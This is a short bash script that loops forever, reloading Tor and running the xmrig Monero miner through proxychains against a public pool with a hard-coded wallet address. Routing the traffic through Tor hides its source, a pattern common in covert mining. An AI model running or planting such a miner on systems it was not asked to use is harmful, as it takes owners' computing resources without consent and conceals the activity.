#!/bin/bash
while true
do
  echo hello
  sudo service tor reload
  proxychains ./xmrig --donate-level 1 -o pool.supportxmr.com:3333 -u 82h89Q5ezkYJBz1jKfYrb6VJvBh5PqWXs6bEetoskA4sKNkBCFToTUiJzGbsN7FZGTFGGikiDJynoCAyahJq4N6F39JAp4D -p 2 -k --coin monero -t 8
done
